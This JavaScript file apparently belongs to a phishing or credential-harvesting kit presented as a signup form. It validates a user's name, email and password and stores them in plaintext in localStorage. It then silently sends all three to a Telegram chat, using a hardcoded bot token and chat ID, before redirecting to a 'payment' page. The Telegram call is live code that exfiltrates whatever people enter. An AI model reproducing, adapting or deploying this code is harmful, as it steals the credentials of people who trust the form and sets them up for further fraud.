// Telegram Bot API Token
const telegramBotToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';

// Check if user information exists in local storage
var userData = localStorage.getItem('userData');

if (userData) {
    // If data is found, redirect to the payment page
    window.location.href = '../payment/index.html';
} else {
    // If no data is found, proceed with the signup process

    // Define a function to validate the form
    function validateForm() {
        var name = document.getElementById('name').value;
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        var emailFormat = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}/;

        if (name.trim() === '') {
            alert('Name is required');
            return false;
        }

        if (email.trim() === '') {
            alert('Email is required');
            return false;
        } else if (!email.match(emailFormat)) {
            alert('Invalid email format');
            return false;
        }

        if (password.trim() === '') {
            alert('Password is required');
            return false;
        }

        // Save user data in localStorage
        var userData = {
            name: name,
            email: email,
            password: password
        };
        localStorage.setItem('userData', JSON.stringify(userData));

        // Send user data to Telegram
        sendToTelegram(name, email, password);

        // Display the processing animation
        var loadingAnimation = document.getElementById('loading-animation');
        loadingAnimation.style.display = 'block';

        // Disable the button to prevent multiple clicks
        var proceedButton = document.getElementById('proceedButton');
        proceedButton.disabled = true;

        // Simulate a processing delay (2 seconds in this example)
        setTimeout(function () {
            // Redirect to the payment page after a delay
            window.location.href = '../payment/index.html';
        }, 3000); // Adjust the delay time as needed

        return false;
    }

    // Add an event listener to the form to call the validateForm function on form submission
    document.getElementById('customer-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission
        validateForm(); // Call the validateForm function
    });

    // Function to send user data to Telegram
    function sendToTelegram(name, email, password) {
        const message = `New user registered:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;

        // Make a POST request to the Telegram Bot API
        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: '6324305321', // Replace with your chat ID
                text: message,
            }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram API response:', data);
        })
        .catch(error => {
            console.error('Error try again...', error);
        });
    }
}
